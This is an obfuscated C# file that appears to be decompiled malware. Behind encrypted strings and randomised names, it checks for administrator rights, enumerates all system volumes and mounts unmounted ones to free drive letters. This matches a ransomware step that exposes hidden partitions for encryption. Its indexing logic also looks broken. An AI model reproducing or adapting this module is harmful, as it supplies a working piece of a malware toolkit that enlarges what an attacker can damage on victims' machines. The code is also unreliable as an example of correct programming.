using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

public static class zKsOSeRCEuOxZ
{
	public enum jTyGqIZzOSEQF : uint
	{
		wIuMCoTzYu,
		bjbLKSWeuTiGam,
		CTTVRsYlnqsZc,
		gwFjrlxBSmUwSDv,
		PJnqlugysCoT,
		KBqmymbwXfuYLnkFP,
		spSSbeJbGUykm
	}

	private sealed class cKtOIQnEhTkA
	{
		public uint sCXKIGLEqDUYE;

		public uint WDLONMutEJjRUc;

		public char[] YtThNZCYOAy;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, YtThNZCYOAy, WDLONMutEJjRUc, ref sCXKIGLEqDUYE))
			{
				return YtThNZCYOAy.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern jTyGqIZzOSEQF GetDriveType([MarshalAs(UnmanagedType.LPStr)] string ccoYGLaKvrvzLcN);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string XGsTmvgYSMs, char[] JJCjdGEBzrGCmb, uint QqAyZOLULzGo, ref uint zwbDNOTryMsa);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> ReXUWEapWRTQ()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void aLXuqmTClRjOFYj()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			cKtOIQnEhTkA CS_0024_003C_003E8__locals0 = new cKtOIQnEhTkA();
			string[] array = new string[26]
			{
				getString_0(107375844),
				getString_0(107375839),
				getString_0(107375834),
				getString_0(107375861),
				getString_0(107375856),
				getString_0(107375851),
				getString_0(107375846),
				getString_0(107375809),
				getString_0(107375804),
				getString_0(107375799),
				getString_0(107375826),
				getString_0(107375821),
				getString_0(107375816),
				getString_0(107375779),
				getString_0(107375774),
				getString_0(107375769),
				getString_0(107375796),
				getString_0(107375791),
				getString_0(107375786),
				getString_0(107375749),
				getString_0(107375744),
				getString_0(107375739),
				getString_0(107375734),
				getString_0(107375761),
				getString_0(107375756),
				getString_0(107375751)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == jTyGqIZzOSEQF.bjbLKSWeuTiGam)
				{
					array2[num++] = text;
				}
			}
			List<string> source = ReXUWEapWRTQ();
			CS_0024_003C_003E8__locals0.sCXKIGLEqDUYE = 0u;
			CS_0024_003C_003E8__locals0.WDLONMutEJjRUc = 120u;
			CS_0024_003C_003E8__locals0.YtThNZCYOAy = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.YtThNZCYOAy, CS_0024_003C_003E8__locals0.WDLONMutEJjRUc, ref CS_0024_003C_003E8__locals0.sCXKIGLEqDUYE) || CS_0024_003C_003E8__locals0.YtThNZCYOAy.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (OwCGWssNrah.RxwgNpmsCUXw)
				{
					try
					{
						Console.WriteLine(getString_0(107375714), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (OwCGWssNrah.SBPYnaSzKyFP)
			{
				try
				{
					File.AppendAllText(OwCGWssNrah.ndioqUCcjeEwRygxn, getString_0(107375721) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static zKsOSeRCEuOxZ()
	{
		Strings.CreateGetStringDelegate(typeof(zKsOSeRCEuOxZ));
	}
}
